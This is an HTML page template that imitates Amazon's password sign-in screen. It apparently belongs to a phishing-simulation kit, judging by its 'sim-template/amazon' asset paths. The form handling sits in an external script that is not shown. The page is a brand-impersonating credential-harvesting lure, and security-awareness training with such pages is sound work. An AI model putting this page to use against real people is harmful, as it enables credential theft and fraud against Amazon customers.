<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Amazon Sign-In</title>
    <link rel="stylesheet" href="https://rsms.me/inter/inter.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />
    <link
      href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css"
      rel="stylesheet"
    />

    <script
      defer
      src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"
    ></script>
    <script defer src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <link rel="stylesheet" href="{{ asset('build/assets/app-7ywPSvxu.css') }}">

    <link rel="stylesheet" href="{{ asset('css/sim-template/amazon/style2.css') }}">
    <script src="{{ asset('js/sim-template/amazon/script2.js') }}" defer></script>
  </head>
  <body>
    <div class="header">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"
        alt="Amazon Logo"
      />
    </div>
    <div class="login-container">
      <div class="login-form">
        <h1>Sign In</h1>
        <form id="login-form">
        <div class="username">
            <p id="userEmailDisplay" class="userEmailDisplay">Loading user data...</p>
            <a href="#" class="change-user">Change</a>
        </div>
          <div class="form-group">
            <div class="head">
                <p class="place">Password</p>
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>
            <input
              type="password"
              id="password"
              name="password"
              placeholder=""
            />
            <div id="password-error" class="error-text" style="display: none">
                Enter your email or mobile phone number
            </div>
            <button type="submit" class="continue-button">Sign In</button>
          </div>
        </form>
      </div>
    </div>

    <footer>
      <div class="footer-link">
        <a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a>
        <a href="#">Help</a>
      </div>
      <p>&copy; 1996-2025, Amazon.com, Inc. or its affiliates</p>
    </footer>
  </body>
</html>
